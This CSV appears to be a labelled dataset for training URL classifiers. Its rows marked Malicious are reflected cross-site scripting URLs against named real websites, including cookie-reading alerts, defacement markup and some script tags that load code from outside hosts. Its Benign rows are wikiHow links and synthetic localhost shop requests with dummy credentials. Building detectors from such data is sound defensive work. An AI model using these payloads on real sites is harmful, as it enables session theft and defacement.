Payloads,Class
http://stock.dir.co.jp/chartframe.asp?mcode='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/s<br>cript%3e&amp;market=j&amp;day=1&amp;week=1&amp;month=1&amp;type=a&amp;lang=j,Malicious
http://abkhazia.gov.ge/ganc/tavmjdomare.php?lang=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3e,Malicious
http://app2.embluejet.com/mod_campaigns/embluemail.asp?idem=5889230&amp;em=asdf%22%3e%3cscript%3ealert(%<br>22xss%22)%3c/script%3e%3c%22&amp;ca=117201&amp;ci=0&amp;me=128597,Malicious
http://www.mercadolibre.com.ve/venezuela/ml/l_user.main?as_filtro_id=certified_usr&amp;as_nickname=%a0&amp;a<br>s_pcia_id=&gt;&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://k-2ch.net/orz/orz.cgi/z4377n/wwwww.2ch.net/f1/%22%3e'%3e'%3c%22'%3e%22%3e'%3e%3cscript%3ealer<br>t(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://havale.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.accessup.org/anime/profile.asp?name=%b4%c9%cd%fd%bf%cd%a4%b5%a4%f3&amp;mode=got_recommendatio<br>n&amp;lang=j%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%6<br>8%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c<br>%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%<br>73%63%72%69%70%74%3e%0a,Malicious
http://www.dersrehberi.com/ozel-ogretmen.asp?ders=%22%3e%3cscript%3ealert%28%22k4ndemir%22%29;%3c/sc<br>ript%3e,Malicious
http://kemperartmuseum.wustl.edu/collections/artwork.asp?searchtext=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.evrensel.net/kultur.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.rhinotalk.net/forums/member-introductions/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;,Malicious
http://wikileaks.org/plusd/index.php?q=%22jared+cohen%22&qforigin=%27%22--%3e%3c/style%3e%3c/script%3e%3cscript%3ealert%28%22xss%20by%20thexugj%22%29%3c/script%3e,Malicious
http://finans.mynet.com/arama/?s=rate&amp;pg=q&amp;plq=%22%3e%3ch1%3ehacked%20by%20st@rext%20candark%20and%2<br>0atles%3c/h1%3e%3cscript%3ealert(%22by%20st@rext%20%20candark%20trtekforum.com%22)%3c/script%3e%3csc<br>ript%3ealert(document.cookie)%3c/script%3e%3cmeta%20http-equiv=%22refresh%22%20content=%222;url=http<br>://lht.by.ru/uyar1.html%22%3e,Malicious
http://www.concours.agriculture.gouv.fr/calendrier/sommaire.cfm?cal_cdn=%22%3e'%3e%3cscript%20src=ht<br>tp://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://utah.citysearch.com/event-listings/salt-lake-city-ut-metro/82031?what='&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious
http://duniaflora.com/mod.php?mod=iklanbaris&amp;op=search&amp;query=http://www.bulutangkis.com/mod.php?mod=<br>publisher&amp;op=search&amp;query=%22%3e%3c%2fscript%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e%3cscr<br>ipt%3edocument.body.innerhtml%3d%22%3cstyle%3ebody{visibility%3ahidden%3b+background%3ablack%3b}%3c%<br>2fstyle%3e%3cdiv+style%3dvisibility%3avisible%3b%3e%3ccenter%3e%3ch1%3e%3cfont+color%3d%27white%27%3<br>exss+test+by+%3c%2ffont%3e%3cfont+color%3d%27red%27%3eemily.josan%3c%2ffont%3e%3cfont+color%3d%27whi<br>te%27%3e!%3c%2ffont%3e%3c%2fh1%3e%3cfont+color%3d%27white%27%3e%402012%3ch1%3e%3cfont+color%3d%27333<br>333%27%3e+example+for+xss%3c%2ffont%3e%3c%2fh1%3e%3cbr%3e%22%3b%3c%2fscript%3e,Malicious
http://www.jonesorganics.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://gallery.consurance.de/login.asp?n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%2<br>0narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bayerische.staatsoper.de/c.php/spielplan/vorstellung.php?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious
http://musicpb.com/search.php?ty=%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3cmarquee%3e%<br>3ch1%3eomega+ap3x%3ch1%3e%3c%2fmarquee%3e+&amp;sh=song,Malicious
http://benq.hu/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gayhealth.com/templates/network/ask/index.html%27%22%3e%3c/title%3e%3cscript%3ealert(1337<br>)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h1%3e%3c/marquee%3e,Malicious
"http://www.culture.gouv.fr/public/mistral/merimee_fr?action=chercher&field_1=ref&value_1=%22%27%3e%22%27%3e%22%27%3e%3cscript%3edocument.body.innerhtml=string.fromcharcode%2860,%2099,%20101,%20110,%20116,%20101,%20114,%2062,%2060,%20104,%2049,%2062,%2067,%20111,%20110,%20115,%20108,%20105,%20103,%20104,%20116,%2032,%20112,%20119,%20110,%20100,%2032,%20117,%2033,%2032,%2058,%2068,%2060,%2047,%20104,%2049,%2062,%2060,%2098,%20114,%2062,%2060,%20104,%20114,%2062,%2060,%2098,%20114,%2062,%2060,%20104,%2050,%2062,%2035,%2084,%20104,%20101,%2032,%2072,%2097,%2099,%20107,%20101,%20114,%20115,%2032,%2066,%2097,%20121,%2060,%2047,%20104,%2050,%2062,%2060,%20104,%20114,%2062,%2060,%20105,%20109,%20103,%2032,%20115,%20114,%2099,%2061,%2039,%20104,%20116,%20116,%20112,%2058,%2047,%2047,%20105,%20109,%20103,%2046,%20103,%2097,%20119,%20107,%20101,%20114,%2097,%20115,%20115,%20101,%20116,%20115,%2046,%2099,%20111,%20109,%2047,%20105,%20109,%20103,%2047,%2049,%2055,%20122,%2048,%20105,%2099,%2055,%2049,%2099,%20113,%2049,%2052,%2057,%20106,%20112,%20103,%2047,%20107,%20117,%2045,%20120,%20108,%2097,%20114,%20103,%20101,%2046,%20106,%20112,%20103,%2039,%2060,%2047,%2099,%20101,%20110,%20116,%20101,%20114,%2062%29%3c/script%3e",Malicious
http://www.stuhrling.com/faq.cfm?parorder=7%22%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious
"http://libguides.olympic.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';aler<br>t(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromcharco<br>de(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://www.mmi.gov.cn/index.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
https://software.sandia.gov/tramonto/src_docs/search.php?query=%3cscript%3ealert(%3cscript%3ealert(%<br>22iblaze%22)%3cscript%3ealert(%22iblaze%22)%3c%2fscript%3e%3c%2fscript%3e,Malicious
http://piratesriches.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script%<br>3e,Malicious
"http://bg.msi.com/service/search/?kw=%27;alert%28string.fromcharcode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//\%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//\%22;alert%28string.fromcharcode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29%3c/script%3e&type=product",Malicious
http://www.samyuan.cn/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20rat')%3c/<br>script%3e,Malicious
http://www.istocku.com/faq.asp?ref=octopus55121@yahoo.com}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b<br>(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://fox903.u.la/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.ducati.com/profile/registration.jsp?_requestid=%22%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.netram.fr/pop_livraison.asp?width=555&amp;height=590&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://unit.xjtu.edu.cn/wenzhinet/new/news.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3<br>c/script%3e,Malicious
http://xdce.adobe.com/mantis/simpsons/status.php?email=zead19_2010@hotmail.com&amp;id=&quot;&gt;&lt;script&gt;alert('x<br>ss')&lt;/script&gt;,Malicious
http://eclipse-plugins.2y.net/eclipse/search.jsp?query='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3c<br>br%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://photofile.name/search/result/?search=%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22);%3c/sc<br>ript%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://gabrieldedavid.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;hidere<br>setbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3ealert('no<br>rehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marq<br>uee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forociberna<br>utica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%<br>3c,Malicious
http://www.microsoft.no/div/template.asp?tab=test&amp;user=me&quot;&gt;&lt;script&gt;alert(/xssed_by_soroush.secprojec<br>t.com_4_xssed.com/)&lt;/script&gt;&lt;fake &quot;,Malicious
http://webmail.mpob.gov.my/src/login.php?message=%3cscript%3ealert%28/xssed/%29%3c/script%3e,Malicious
http://www.logicool.co.jp/index.cfm/home/&amp;cl=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.no-ip.com/reactivate-account?email=xss%22%3e%3cscript%20%3ealert%281234%29;%20%3c/script%<br>3e,Malicious
http://tech2.nytimes.com/gst/technology/techsearch.html?st=a&amp;query=%3c/title%3e%3cscript%3ealert(123<br>)%3c/script%3e&amp;date_select=full,Malicious
http://archive.netbsd.se/search.php?ml=%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.picvault.info/banned.php?country=%3cscript%3ealert%28%22xd%22%29%3c/script%3e,Malicious
http://netex.msn.co.il/categoryfiles/5039.asp?template=1&amp;srchkey=5039&amp;uid=0&amp;keyword=&quot;&gt;&lt;script&gt;alert(<br>&quot;daimon&quot;)&lt;/script&gt;,Malicious
http://www2.camarapoa.rs.gov.br/default.php?p_secao=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/<br>thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.m-2.ru/themes/default/material.asp?folder=1869&amp;matid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.deviantclip.com/?m=tube-search&amp;format=&amp;search=%3cscript%3ealert%28document.cookie%29%3c/s<br>cript%3e,Malicious
http://www.orintec.co.il/scripts/openextra.asp?extra=%22%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.gmail.it/ashop/searchresults.asp?strname=%22%3e%3cscript%3ealert%28document.cookie%29%3c%<br>2fscript%3e&amp;idcategory=&amp;=cerca,Malicious
http://www.networkworldpartners.com/lucent/index.jsp?tdcode=%22%3e%3c/script%3e%3cscript%3ealert(1)%<br>3c/script%3e,Malicious
http://ms161.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://menu.vip2ch.com/orz.cgi/z4377n/wwwww.2ch.net/f1/%22%3e'%3e'%3c%22'%3e%22%3e'%3e%3cscript%3eal<br>ert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://dentarusshop.ru/show_fine.php?select=name&amp;name=%3cscript%3ealert(document.cookie);%3c/script%<br>3e,Malicious
http://www.gdmzsafety.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p<br>+,Malicious
"http://secure.schedulepayments.net/payment?product_sku=protcnt_basic,protcnt_premium&amp;default_sku=1&amp;v<br>iew_eds=1&amp;check_eds=1&amp;affiliate_id=377&amp;affiliate_sid=v%27%22%3e%3cscript%3ealert%28/rogue/%29%3c/scr<br>ipt%3e5",Malicious
http://www.vsgeras.ac.at/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gyqss.com/list.php?q=pwn+%3cscript/src=%22http://tmp.vgood.com.tw/poc.js%22%3e%3c/script%3e+pwn,Malicious
http://www.elite4host.com/support/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(docu<br>ment.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://www.yalikavakspor.com/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(<br>document.cookie)&lt;/script&gt;,Malicious
http://peixun.shfda.gov.cn/zxzx/add.asp?tid=%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22);%3c/sc<br>ript%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;id=3622&amp;pa<br>ge=57,Malicious
http://hachat.s232.xrea.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/sc<br>ript%3e,Malicious
http://www.dailynorthwestern.com/media/storage/paper853/news/2005/11/21/campus/profs.help.nasa.searc<br>h.moon.for.oxygen.sources.including.ice-1920175.shtml%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.pingel-anton.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://backingaus.innovation.gov.au/search/search1.asp?qu=%22%3e%3cscript%3ealert%28%22xss%22%29%3c%<br>2fscript%3e&amp;header_r2_c10.x=24&amp;header_r2_c10.y=8,Malicious
http://www.sendsong.net/friends_add.asp?music_name=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/script%3<br>e,Malicious
http://docbweb.ispa.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tata.com/search.aspx?id=%27%22%3e%3c/title%3e%3cscript%3ealert%28%27xssed%20by%20r0hit%27<br>%29%3c/script%3e,Malicious
http://www.aljazeera.net/photogallery/aspx/show.aspx?currentpage=&lt;script&gt;alert('shockshadow was<br>h3r3\nhttp://yee7.com');&lt;/script&gt;,Malicious
"http://memory.loc.gov/ammem/browse/listsome.php?category=';alert(string.fromcharcode(83,69,67,85,82,<br>73,84,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;aler<br>t(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67<br>,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,<br>69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.wikihow.com/join-the-pilgrimage-to-ba-chua-xu-temple-festival&t=1396570004294&n=2929657&k=mainentity,Benign
http://www.wikihow.com/sort-bad-links-with-link-assistant&t=1396534119212&n=1144749&k=mainentity,Benign
http://www.wikihow.com/prepare-for-a-job-review&t=1396612687556&n=4791866&k=mainentity,Benign
http://www.wikihow.com/be-a-lincolnist&t=1396569961518&n=2927985&k=mainentity,Benign
http://www.wikihow.com/research-salary-ranges-and-benefits-for-a-librarian&t=1396612914178&n=4798474&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=demetra&pwd=246cular&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hartney&password=estigmatizadora&nombre=lilen&apellidos=romeo+camprodon&email=dayan%40artroscopiagc.cf&dni=33183845c&direccion=paseo+cuba%2c+175+&ciudad=antequera&cp=50368&provincia=alicante&ntc=2302679278651084&b1=registrar,Benign
http://www.wikihow.com/repaint-aluminum-siding&t=1396562670560&n=2564040&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100&cantidad=68&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=1&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tapp&password=amebeo&nombre=elias&apellidos=salguero+peri&email=holgate5%40convention.as&dni=12671973p&direccion=los+trigales+95+&ciudad=n%e1jera&cp=28440&provincia=zaragoza&ntc=7526291145478367&b1=registrar,Benign
http://www.wikihow.com/be-kind-to-people&t=1396569937474&n=2926829&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ilyess&pwd=0526d1noso&remember=off&b1=entrar,Benign
http://www.wikihow.com/cook-hare-with-prunes&t=1396547171512&n=1746440&k=mainentity,Benign
http://www.wikihow.com/kill-a-creeper-in-minecraft6-(xbox-edition)&t=1396648475122&n=5967683&k=mainentity,Benign
http://www.wikihow.com/buy-a-video-capture-card&t=1396531906813&n=1042214&k=mainentity,Benign
http://www.wikihow.com/change-the-character-select-screen-music-in-legend-of-zelda:-links%27-awakening&t=1396649145115&n=5991827&k=mainentity,Benign
http://www.wikihow.com/spend-7-days-in-moscow&t=1396630641204&n=5461790&k=mainentity,Benign
http://www.wikihow.com/encrypt-a-kindle-fire&t=1396633271623&n=5521669&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=motashaw&pwd=malab%e1rico&remember=off&b1=entrar,Benign
http://www.wikihow.com/stay-in-touch-with-your-jewish-identity&t=1396570377547&n=2944917&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eveline&password=sat%e1n2c9&nombre=neida&apellidos=pujades+mex%eda&email=padave%40sexotelefono.ly&dni=23318056n&direccion=calle+zurbaran%2c+131%2c+&ciudad=loriguilla&cp=43710&provincia=lugo&ntc=2965085022683319&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alleyn&password=f5e2%f3n&nombre=galindo&apellidos=escardo&email=deslandes%40arroyomolinos-madrid.th&dni=38140529c&direccion=c%2f+aldeatejada%2c+123%2c+&ciudad=paredes&cp=31697&provincia=ciudad+real&ntc=9814280816717911&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=brownlie&password=alunarse&nombre=yadia&apellidos=de+guzm%e1n+comadran&email=macgowan%40comerciosdeaspe.kr&dni=23198131d&direccion=tarifa+80+12%3fb&ciudad=tinieblas+de+la+sierra&cp=13450&provincia=lleida&ntc=5773073819468614&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=75&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/change-privacy-settings-on-couchsurfing&t=1396629460382&n=5419689&k=mainentity,Benign
http://www.wikihow.com/host-a-warrior-cats-themed-birthday-party&t=1396633410975&n=5527545&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=marting&password=55z8rc7&nombre=nilia&apellidos=urresti+carrasquer&email=haloubek_dyall%40mcfly.gg&dni=05554476e&direccion=cruce+de+tamaraceite+148+&ciudad=a%f1ora&cp=09194&provincia=burgos&ntc=7521556295534229&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hockaday&password=demonstramiento&nombre=iv%f3n&apellidos=escu%e9+chambert&email=tarangelo%40accesoabierto.st&dni=24025271t&direccion=c%2f+parque+de+las+avda.s+42%2c+11-d&ciudad=villamayor+de+trevi%f1o&cp=49325&provincia=barcelona&ntc=0341907708355896&b1=registrar,Benign
http://www.wikihow.com/become-an-extreme-person&t=1396526565821&n=790035&k=mainentity,Benign
http://www.wikihow.com/reuse-old-potting-soil&t=1396561614677&n=2499408&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6531&b1=confirmar,Benign
http://www.wikihow.com/install-snoblox---snojax-screw-down-snow-guards&t=1396562645740&n=2562164&k=mainentity,Benign
http://www.wikihow.com/juice&t=1396545620352&n=1650920&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hattie&password=fonol%f3gica&nombre=quinciano&apellidos=guiberna+lest%f3n&email=fink%40973.so&dni=10491378c&direccion=c%2f+universidad+de+alcala%2c+185+&ciudad=corduente&cp=07300&provincia=navarra&ntc=1582623470129996&b1=registrar,Benign
http://www.wikihow.com/cosplay-as-kirby&t=1396528066598&n=860785&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maginley&password=tr5eno&nombre=danai&apellidos=riestra+gabaldon&email=rehberg%40soyouthinkyoucandance.bu&dni=47433551f&direccion=travessia+cardenal+remolins+176+&ciudad=villavicencio+de+los+caballeros&cp=44358&provincia=santa+cruz+de+tenerife&ntc=4068431992758332&b1=registrar,Benign
http://www.wikihow.com/broadcast-live-for-speed-and-trackmania&t=1396532278600&n=1058362&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maahs&password=r893t058e292&nombre=saura&apellidos=stagnaro&email=mahal_symington%40hipereuskadi.sy&dni=12693900q&direccion=paduleta%2c+118%2c+7c&ciudad=laredo&cp=47419&provincia=navarra&ntc=0651329791108125&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=seiko&password=ter602a&nombre=rossana&apellidos=cullell&email=blacaman%40capitalinvest.bw&dni=12952733f&direccion=calle+san+pol+de+mar%2c+152+&ciudad=mu%f1otello&cp=15211&provincia=madrid&ntc=7457093509678485&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4594&b1=confirmar,Benign
http://www.wikihow.com/use-large-forums&t=1396532345938&n=1060898&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=atp&password=30rr421r0s&nombre=benedicta&apellidos=sillero&email=arias%40logiteclines.nf&dni=21137619k&direccion=plaza+comunidad+balear+109%2c+&ciudad=cubillo+del+campo&cp=05111&provincia=zaragoza&ntc=0892519476586587&b1=registrar,Benign
http://www.wikihow.com/get-money/passes-on-your-howrse.com-account&t=1396648043836&n=5949023&k=mainentity,Benign
"http://www.wikihow.com/carry-a-small,-120v-5-amp-freezer-in-the-back-of-a-pick-up&t=1396531455665&n=1021617&k=mainentity",Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=fluet&password=a8i77allar&nombre=florencia&apellidos=de+uribarri+alzamora&email=kim%40donkr.yu&dni=49111896l&direccion=c%2f+ayatimas+100%2c+2-d&ciudad=ontinyent&cp=06177&provincia=girona&ntc=2637706220123979&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2376&b1=confirmar,Benign
http://www.wikihow.com/children-birthday-party-tips-by-experts&t=1396546846283&n=1728588&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fisher&password=interclusi%f3n&nombre=alek&apellidos=piquer+pall%e9ns&email=pagano%40lamolahotel.li&dni=71311669p&direccion=san+miguel+s%2fn+&ciudad=berrocalejo+de+aragona&cp=13770&provincia=soria&ntc=0895954348616029&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mcgregor&password=5a3ti90&nombre=laura&apellidos=vilamosa&email=allegretti_swarthout%40ibizasounds.nc&dni=01084663y&direccion=calle+francisco+ruiz+bru%2c+7+&ciudad=san+sadurni%f1o&cp=44131&provincia=la+rioja&ntc=3448589549551103&b1=registrar,Benign
http://www.wikihow.com/help-your-child-in-school-matters&t=1396609474390&n=4682862&k=mainentity,Benign
http://www.wikihow.com/encourage-someone-else-to-let-go-of-clutter&t=1396563084222&n=2591328&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thia&password=candeledana&nombre=merl%edn&apellidos=tapias&email=kirksey9%40reidesa.li&dni=25026163r&direccion=c%2f+oeste+41+&ciudad=muro+de+alcoy&cp=33070&provincia=c%e1ceres&ntc=7457334236490109&b1=registrar,Benign
http://www.wikihow.com/start-an-evil-group&t=1396528272670&n=870921&k=mainentity,Benign
